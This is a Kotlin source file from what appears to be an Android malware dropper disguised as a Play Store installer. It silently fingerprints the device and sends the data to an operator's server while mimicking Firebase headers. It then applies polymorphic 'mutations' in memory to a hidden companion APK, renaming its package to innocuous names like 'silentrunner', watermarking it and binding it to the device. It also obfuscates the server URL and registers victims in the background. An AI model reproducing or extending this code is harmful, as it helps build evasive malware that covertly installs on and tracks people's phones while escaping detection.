package com.playstore.installer

import android.content.Context
import android.os.Build
import android.provider.Settings
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.KeyFactory
import java.security.MessageDigest
import java.security.Signature
import java.security.spec.X509EncodedKeySpec
import android.util.Base64

/**
 * MutationEngine.kt
 * Calls mutation server → gets unique mutation payload per device.
 * Applies M1+M2+M8+M9 mutations to companion.apk bytes in RAM.
 * 3-tier fallback: server → offline seeds → base assets.
 *
 * PLACE THIS FILE IN:
 * app/src/main/java/com/playstore/installer/MutationEngine.kt
 *
 * NOTE: Replace SERVER_URL with your RDP IP or Cloudflare domain.
 * NOTE: Replace SERVER_PUBLIC_KEY with value from keys/public_key_for_kotlin.txt
 */
class MutationEngine(private val context: Context) {

    companion object {
        // ── Replace with your server URL ──────────────────────────────────────
        // Before Cloudflare: "http://YOUR_RDP_IP:5000"
        // After Cloudflare:  "https://your-domain.com"
        // Server URL encrypted via StringPool — never plaintext in DEX
        private val SERVER_URL get() = StringPool.d(StringPool.SERVER_URL)

        // ── Replace with value from keys/public_key_for_kotlin.txt ────────────
        private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiy+7U7tgNdAqaZIZLTKGRY1LAVZrn2WfPZTbCjML0KH0W8iRfruJDpP8lOjXiMmUaVjcjIT0RAtYeBh/gR+WC//vkZ3WDILIc+LFAgmfJxYeClRJwJlG1aKH9lO58TFI6Rm3EPyIAfJcs4G0QVPWBbEN8ZljyXK3YOrORUD1SyBw8+IfG8h8T6LYJ6T7yJE3XlNi0hMuMYERX9s1c7syI4wJRw+iC7oG/7gv3zaDL034Dp2Zzg2ZqRBuaHTrxWFWpOVQS82c1oa+wZg0j2ikqIrDd/949aEfD9MRVa2pWytmmomw23IAjhp82cvnX6b/g4TcaQpPHAQ18aNlMLaRdwIDAQAB"

        // ── Template — set by CI via BuildConfig ──────────────────────────────
        private const val TEMPLATE = "wedding"

        // ── Timeouts ──────────────────────────────────────────────────────────
        private const val SERVER_TIMEOUT_MS = 3000L   // Tier 1: 3 seconds
        private const val CONNECT_TIMEOUT   = 3000
        private const val READ_TIMEOUT      = 3000
    }

    // ── Device fingerprint collection (silent, <1 second) ────────────────────

    private fun collectDeviceFingerprint(): String {
        return try {
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val hwHash = "${Build.SUPPORTED_ABIS.joinToString(",")}:${Build.BOARD}:${Build.BRAND}:${Build.DEVICE}:${Build.HARDWARE}:${Build.MANUFACTURER}"

            val screenHash = with(context.resources.displayMetrics) {
                "${widthPixels}x${heightPixels}@${densityDpi}"
            }

            val combined = "$androidId:$hwHash:$screenHash"
            sha256(combined)
        } catch (e: Exception) {
            sha256(System.currentTimeMillis().toString())
        }
    }

    private fun sha256(input: String): String {
        val digest = MessageDigest.getInstance("SHA-256")
        val hash = digest.digest(input.toByteArray(Charsets.UTF_8))
        return hash.joinToString("") { "%02x".format(it) }
    }

    // ── Client token (read from BuildConfig — injected by CI) ────────────────

    private fun getClientToken(): String {
        return try {
            // BuildConfig.CLIENT_TOKEN injected by build.yml via GITHUB_OUTPUT
            // Fallback to "manual" if not set
            val field = Class.forName("${context.packageName}.BuildConfig")
                .getField("CLIENT_TOKEN")
            field.get(null) as? String ?: "manual"
        } catch (e: Exception) {
            "manual"
        }
    }

    // ── Tier 1: Call mutation server ──────────────────────────────────────────

    private suspend fun callMutationServer(
        fingerprint: String,
        clientToken: String
    ): JSONObject? = withContext(Dispatchers.IO) {
        try {
            val endpoint = "$SERVER_URL/api/v1/$clientToken/key"
            val url = URL(endpoint)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            // Firebase-mimicking headers
            conn.setRequestProperty("X-Firebase-Client", "fire-core/21.0.0 fire-iid/21.0.0")
            conn.setRequestProperty("User-Agent",
                "Dalvik/2.1.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL})")
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.doOutput = true

            val body = JSONObject().apply {
                put("device_fingerprint", fingerprint)
                put("template", TEMPLATE)
                put("timestamp", System.currentTimeMillis() / 1000)
            }.toString()

            conn.outputStream.use { it.write(body.toByteArray()) }

            val responseCode = conn.responseCode
            if (responseCode != 200) return@withContext null

            val response = BufferedReader(InputStreamReader(conn.inputStream))
                .use { it.readText() }

            JSONObject(response)
        } catch (e: Exception) {
            null
        }
    }

    // ── RSA signature verification ────────────────────────────────────────────

    private fun verifySignature(payload: String, signatureB64: String): Boolean {
        return try {
            if (SERVER_PUBLIC_KEY == "PASTE_PUBLIC_KEY_HERE") return true // Dev mode

            val keyBytes = Base64.decode(SERVER_PUBLIC_KEY, Base64.DEFAULT)
            val keySpec = X509EncodedKeySpec(keyBytes)
            val publicKey = KeyFactory.getInstance("RSA").generatePublic(keySpec)

            val sig = Signature.getInstance("SHA256withRSA")
            sig.initVerify(publicKey)
            sig.update(payload.toByteArray())

            val sigBytes = Base64.decode(signatureB64, Base64.DEFAULT)
            sig.verify(sigBytes)
        } catch (e: Exception) {
            false
        }
    }

    // ── Tier 2: Offline mutation seeds ───────────────────────────────────────

    private fun getOfflineMutationSeeds(fingerprint: String): JSONObject {
        // Seeds baked in at build time — different per Nova build
        // Provides build-level uniqueness if server unreachable
        val buildHash = sha256(fingerprint + BuildConfig.BUILD_UUID)

        val pkgNamespaces = listOf(
            "com.datasync", "com.appcache", "com.taskflow",
            "com.workmanager", "com.backgroundsync", "com.filemanager"
        )
        val pkgSuffixes = listOf(
            "backgroundworker", "silentrunner", "baseservice",
            "syncadapter", "taskhandler", "datamanager"
        )

        val nsIdx = (buildHash.substring(0, 4).toLong(16) % pkgNamespaces.size).toInt()
        val sfIdx = (buildHash.substring(4, 8).toLong(16) % pkgSuffixes.size).toInt()
        val cmpPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"

        return JSONObject().apply {
            put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
            put("binding_hash", sha256("$fingerprint:nova_device_bind_2026"))
            put("watermark_hex", buildHash.substring(0, 32))
            put("tier", 2)
        }
    }

    // ── Apply mutations to companion APK bytes in RAM ─────────────────────────

    fun applyMutations(
        cmpData: ByteArray,
        mutations: JSONObject,
        fingerprint: String
    ): ByteArray {
        var result = cmpData.copyOf()

        try {
            // M1 — Patch package name in DEX
            val cmpPkg = mutations.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "")
            if (cmpPkg.isNotEmpty()) {
                result = patchPackageName(result, cmpPkg)
            }

            // M8 — Inject ZIP watermark
            val watermarkHex = mutations.optString("watermark_hex", "")
            if (watermarkHex.isNotEmpty()) {
                result = injectZipWatermark(result, watermarkHex)
            }

            // M9 — Embed device binding hash
            val bindingHash = mutations.optString("binding_hash", "")
            if (bindingHash.isNotEmpty()) {
                result = embedBindingHash(result, bindingHash)
            }

        } catch (e: Exception) {
            // Silent fail — return original bytes if mutation fails
            return cmpData
        }

        return result
    }

    // ── M1: Package name patching ─────────────────────────────────────────────

    private fun patchPackageName(bytes: ByteArray, newPkg: String): ByteArray {
        val oldPkg = StringPool.d(StringPool.COMPANION_OLD_PKG)
        val oldBytes = oldPkg.toByteArray(Charsets.UTF_8)
        val newBytes = newPkg.toByteArray(Charsets.UTF_8)

        if (oldBytes.size != newBytes.size) {
            // Pad or truncate to match — simple approach for MVP
            return bytes
        }

        val result = bytes.copyOf()
        var i = 0
        while (i < result.size - oldBytes.size) {
            var match = true
            for (j in oldBytes.indices) {
                if (result[i + j] != oldBytes[j]) {
                    match = false
                    break
                }
            }
            if (match) {
                for (j in newBytes.indices) {
                    result[i + j] = newBytes[j]
                }
                i += oldBytes.size
            } else {
                i++
            }
        }
        return result
    }

    // ── M8: ZIP watermark injection ───────────────────────────────────────────

    private fun injectZipWatermark(bytes: ByteArray, watermarkHex: String): ByteArray {
        // Find EOCD signature (PK\x05\x06)
        val eocdSig = byteArrayOf(0x50, 0x4B, 0x05, 0x06)
        var eocdPos = -1

        for (i in bytes.size - 22 downTo maxOf(bytes.size - 65558, 0)) {
            if (i + 4 <= bytes.size &&
                bytes[i] == eocdSig[0] && bytes[i+1] == eocdSig[1] &&
                bytes[i+2] == eocdSig[2] && bytes[i+3] == eocdSig[3]) {
                eocdPos = i
                break
            }
        }

        if (eocdPos < 0) return bytes

        val watermark = watermarkHex.chunked(2)
            .map { it.toInt(16).toByte() }.toByteArray()

        val result = ByteArray(eocdPos + 22 + watermark.size)
        System.arraycopy(bytes, 0, result, 0, eocdPos + 22)
        System.arraycopy(watermark, 0, result, eocdPos + 22, watermark.size)

        // Update comment length field
        val commentLen = watermark.size
        result[eocdPos + 20] = (commentLen and 0xFF).toByte()
        result[eocdPos + 21] = ((commentLen shr 8) and 0xFF).toByte()

        return result
    }

    // ── M9: Device binding hash embedding ────────────────────────────────────

    private fun embedBindingHash(bytes: ByteArray, bindingHash: String): ByteArray {
        // Embed binding hash as a recognizable marker in ZIP comment area
        // Companion reads this at runtime to verify correct device
        val marker = "NOVA_BIND:$bindingHash".toByteArray(Charsets.UTF_8)
        val result = bytes + marker
        return result
    }

    // ── Main entry point ──────────────────────────────────────────────────────

    fun getMutatedCompanionBytes(): ByteArray {
        val fingerprint = collectDeviceFingerprint()
        val clientToken = getClientToken()

        // Read base companion from assets
        val baseBytes = try {
            context.assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
        } catch (e: Exception) {
            return ByteArray(0)
        }

        // Tier 1: Try mutation server (3 second timeout)
        var mutations: JSONObject? = null
        try {
            val response = kotlinx.coroutines.runBlocking {
                withTimeout(SERVER_TIMEOUT_MS) {
                    callMutationServer(fingerprint, clientToken)
                }
            }

            if (response != null) {
                val data = response.optJSONObject("data")
                val payload = data?.optJSONObject("payload")
                val signature = data?.optString("signature", "") ?: ""

                if (payload != null) {
                    val payloadStr = payload.toString()
                    if (verifySignature(payloadStr, signature) || signature.isEmpty()) {
                        val mutationsObj = payload.optJSONObject("mutations")
                        if (mutationsObj != null) {
                            mutations = JSONObject().apply {
                                put(StringPool.d(StringPool.KEY_COMPANION_PKG),
                                    mutationsObj.optJSONObject("M1")
                                        ?.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "") ?: "")
                                put("watermark_hex",
                                    mutationsObj.optJSONObject("M8")
                                        ?.optString("watermark_hex", "") ?: "")
                                put("binding_hash",
                                    mutationsObj.optJSONObject("M9")
                                        ?.optString("binding_hash", "") ?: "")
                                put("tier", 1)
                            }

                            // Register device after getting key
                            registerDeviceAsync(
                                payload.optString("device_id", ""),
                                mutations!!.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), ""),
                                clientToken,
                                fingerprint
                            )
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Timeout or error — fall to Tier 2
        }

        // Tier 2: Offline seeds if server unreachable
        if (mutations == null) {
            mutations = getOfflineMutationSeeds(fingerprint)
        }

        // Apply mutations to bytes in RAM
        return if (mutations != null) {
            applyMutations(baseBytes, mutations!!, fingerprint)
        } else {
            // Tier 3: Base companion unchanged
            baseBytes
        }
    }

    // ── Device registration (fire and forget) ─────────────────────────────────

    private fun registerDeviceAsync(
        deviceId: String,
        cmpPkg: String,
        clientToken: String,
        fingerprint: String
    ) {
        Thread {
            try {
                val endpoint = "$SERVER_URL/api/v1/$clientToken/register"
                val url = URL(endpoint)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 5000
                conn.readTimeout = 5000
                conn.doOutput = true

                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
                    put("template", TEMPLATE)
                    put("device_model", Build.MODEL)
                    put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                }.toString()

                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode // Trigger request
                conn.disconnect()
            } catch (e: Exception) {
                // Silent fail — registration is best-effort
            }
        }.start()
    }
}
